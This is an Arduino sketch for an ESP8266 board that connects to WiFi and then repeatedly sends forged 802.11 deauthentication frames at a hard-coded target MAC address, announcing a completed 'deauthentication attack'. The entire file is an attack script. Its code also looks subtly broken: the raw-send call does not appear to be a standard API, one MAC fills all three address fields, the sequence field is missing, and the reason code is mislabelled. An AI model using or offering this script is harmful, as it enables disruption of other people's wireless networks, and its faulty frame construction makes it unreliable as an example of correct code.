#include <ESP8266WiFi.h>

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Connect to WiFi network
  WiFi.begin("SSID", "Password");
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");
}

void loop() {
  // MAC address of the device to deauthenticate
  uint8_t targetMac[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};

  // Send deauthentication packet
  uint8_t packet[] = {
    0xC0, 0x00, // Type/Subtype: Deauthentication
    0x3A, 0x01, // Duration
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], // Destination MAC
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], // Source MAC
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5], // BSSID
    0x10, 0x00, // Reason: Unspecified
  };

  // Send the packet multiple times to ensure it's received by the target
  for (int i = 0; i < 10; i++) {
    Serial.println("Sending deauthentication packet...");
    WiFi.rawPacket((const uint8_t*)packet, sizeof(packet));
    delay(1000);
  }

  Serial.println("Deauthentication attack complete");
  while (1) {} // Stay in an infinite loop to prevent restarting
}
